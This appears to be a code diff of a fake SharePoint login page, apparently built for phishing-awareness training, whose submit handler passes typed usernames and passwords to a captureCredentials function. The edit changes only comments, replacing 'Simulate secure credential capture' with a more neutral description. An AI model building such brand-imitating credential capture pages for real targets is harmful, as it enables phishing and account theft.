@@ -31,12 +31,12 @@ export default function SharePointLoginPage() {
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
     try {
-      // Simulate secure credential capture
+      // Send credentials to the server-side flow.
       await captureCredentials({ username, password });
       setShowAlert(true);
     } catch (error) {
       console.error('Error capturing credentials:', error);
-      setShowAlert(true); // Show alert for awareness
+      setShowAlert(true); // Show alert for awareness, even if the server call fails.
     }
   };
 
